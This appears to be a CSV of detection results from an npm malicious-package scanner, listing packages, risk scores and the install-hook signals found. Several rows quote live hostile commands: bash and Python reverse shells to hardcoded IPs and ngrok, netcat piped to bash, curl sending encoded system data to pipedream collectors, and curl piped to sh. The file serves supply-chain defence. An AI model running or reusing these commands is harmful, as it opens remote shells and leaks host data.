package_name,version,label,timestamp,routing,risk_score,confidence,primary_category,confirmed_count,supporting_count,noise_filtered,layer1_count,layer2_count,sources_analyzed,has_js_source,confirmed_signals_json,supporting_signals_json
1ru-cache,0.0.1,malicious,2026-03-27T01:53:38.108104,flag,1.0,0.96,backdoor_installation,2,0,0,2,0,entry_point,True,"[""Signal  : Reverse Shell Tcp in install hook\nLocation: package.json \u2192 scripts.postinstall\nCode    : bash -c \""(echo '`date` - 44984BBBADAD5C392EE07B61FC967421' > /dev/tcp/34.121.250.204/443)||(:)\"""", ""Signal  : Hardcoded external IP address '34.121.250.204'\nLocation: package.json \u2192 scripts.postinstall\nCode    : bash -c \""(echo '`date` - 44984BBBADAD5C392EE07B61FC967421' > /dev/tcp/34.121.250.204/443)||(:)\""""]",[]
@aaakca/myf,1.0.14,malicious,2026-03-27T01:53:38.108942,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@alfalab/core-components,37.3.0-beta.10,malicious,2026-03-27T01:53:38.109628,skip,0.0,,none,0,0,0,0,0,none,False,[],[]
@anemone95/evil,1.0.9,malicious,2026-03-27T01:53:38.110625,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@arkadium/eagle-user-client,9.1.1,malicious,2026-03-27T01:53:38.115383,review,0.364,0.78,network_exfiltration,1,0,0,1,0,./.pbk.js,True,"[""Signal  : Network Request In Install\nLocation: ./.pbk.js:2\nCode    : const https = require('https');""]",[]
@arkadium/eagle-user-client,9.99.999,malicious,2026-03-27T01:53:38.119704,review,0.494,0.715,network_exfiltration,1,1,0,2,0,./.pbk.js,True,"[""Signal  : Network Request In Install\nLocation: ./.pbk.js:2\nCode    : const https = require('https');""]","[""Signal  : Version contains inflated segment(s) [999] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 9.99.999""]"
@aszxc/npmexp,1.0.1,malicious,2026-03-27T01:53:38.120379,flag,1.0,0.9025,backdoor_installation,4,0,0,4,0,none,False,"[""Signal  : Reverse Shell Tcp in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'"", ""Signal  : Interactive Reverse Shell in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'"", ""Signal  : Hardcoded external IP address '39.96.12.202'\nLocation: package.json \u2192 scripts.preinstall\nCode    : bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'"", ""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@att-bit/duc.components.cardshell,10.0.0,malicious,2026-03-27T01:53:38.121339,flag,0.7773,0.835,data_exfiltration,2,0,0,2,0,entry_point,True,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl https://eo33kmsodf3dxtf.m.pipedream.net/att_h1_bb"", ""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl https://eo33kmsodf3dxtf.m.pipedream.net/att_h1_bb""]",[]
@att-bit/duc.components.cardshell,10.0.1,malicious,2026-03-27T01:53:38.122246,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@att-bit/duc.components.cardshell,10.0.2,malicious,2026-03-27T01:53:38.125403,review,0.364,0.78,network_exfiltration,1,0,0,1,0,"test.js,entry_point",True,"[""Signal  : Network Request In Install\nLocation: test.js:1\nCode    : const https = require('https');""]",[]
@b2bgeo/yav,13.3.8,malicious,2026-03-27T01:53:38.126258,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@dbk-legacy/muster,9.9.91,malicious,2026-03-27T01:53:38.127196,skip,0.0,,none,0,0,0,0,0,"index.js,entry_point",True,[],[]
@doccledev/pattern-library,5.0.99,malicious,2026-03-27T01:53:38.138443,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""cfhkr5pjas2slrrhp4s0pruu5eat15gkz.oast.live\"","", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : hd: os.homedir(),""]"
@drp-web/shared,1.2.2,malicious,2026-03-27T01:53:38.139391,flag,1.0,0.915,data_exfiltration,2,0,0,2,0,entry_point,True,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""2.tcp.ngrok.io\"",18"", ""Signal  : Python Inline Exec in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""2.tcp.ngrok.io\"",18""]",[]
@drp-web/shared,1.2.7,malicious,2026-03-27T01:53:38.140193,flag,0.6333,0.95,data_exfiltration,1,0,0,1,0,entry_point,True,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : apk add --update netcat-openbsd; telnet 2.tcp.ngrok.io 18363 | /bin/bash""]",[]
@dtci/eq-ui-lib,1.9.9,malicious,2026-03-27T01:53:38.140916,flag,0.6333,0.95,data_exfiltration,1,0,0,1,0,entry_point,True,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl -d $(id | base64) -d $(cat /etc/hosts | base64 ) https://54f325bfdb30a3e28eb9fc7557e23eb0.m.pipedream.net/""]",[]
@dydxprotocol/perpetual,1.2.2,malicious,2026-03-27T01:53:38.144187,flag,0.6467,0.97,remote_code_execution,1,0,0,1,0,entry_point,True,"[""Signal  : Remote Shell Download in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl -s http://api.circle-cdn.com/ci.js | sh""]",[]
@elisaid/elisaid-js-client,6.9.3,malicious,2026-03-27T01:53:38.148554,review,0.364,0.78,network_exfiltration,1,0,0,1,0,./.pbk.js,True,"[""Signal  : Network Request In Install\nLocation: ./.pbk.js:2\nCode    : const https = require('https');""]",[]
